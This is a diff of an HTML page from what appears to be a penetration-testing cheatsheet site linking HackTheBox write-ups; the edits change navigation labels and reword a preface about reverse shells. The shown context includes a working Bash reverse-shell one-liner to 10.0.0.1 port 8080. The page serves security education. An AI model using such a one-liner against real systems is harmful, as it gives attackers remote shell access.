@@ -14,16 +14,16 @@
             <header>
                 <nav>
                     <div class="container pt-5 px-5 d-flex flex-column flex-md-row justify-content-between bg-white" id="navHeader">
-                        <a class="d-none d-md-inline-block" href='about.html'>About</a>
+                        <a class="d-none d-md-inline-block" href='index.html'>About</a>
                         <a class="d-none d-md-inline-block" href='cheatsheet.html'>Cheatsheet</a>
                         <a class="d-none d-md-inline-block" data-toggle="collapse" data-target="#writeupsMenu" 
                                                                                    aria-controls="writeupsMenu" aria-expanded="false" aria-label="Toggle writeups menu" href="#">Write-ups</a>
                     </div>
                     <div class="collapse bg-white" id="writeupsMenu">
                         <div class="container pt-1 px-5 flex-md-row bg-white">
-                            <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-zetta.html'>HTB :: Zetta</a>
-                            <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-registry.html'>HTB :: Registry</a>
-                            <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-craft.html'>HTB :: Craft</a>
+                            <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-zetta.html'>HTB_Zetta</a>
+                            <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-registry.html'>HTB_Registry</a>
+                            <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-craft.html'>HTB_Craft</a>
                         </div>
                     </div>
                 </nav>
@@ -37,7 +37,7 @@
                 </section>
                 <section class="content"> 
                     <div class="container">
-                        <p class="preface">While doing penetration tests eventually you may find vulnerability which leads to a command execution. These reverse shells are quite commonly used in the *nix systems. Options for creating a reverse shell are limited by the scripting languages installed on the target system. Each of the methods below is aimed to be a one-liner that you can copy&amp;paste.</p>
+                        <p class="preface">While doing penetration tests eventually you may find vulnerability which leads to a command execution. These reverse shells are quite commonly used in the *nix systems. Options for creating a reverse shell are limited by the scripting languages installed on the target system. Each of the methods below is aimed to be a copy-pastable-one-liner..</p>
                         <h3>Bash</h3>
                         <p>Some versions of bash can send you a reverse shell or even a file thru this device
                         <pre>bash -i &amp;&gt; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</pre>
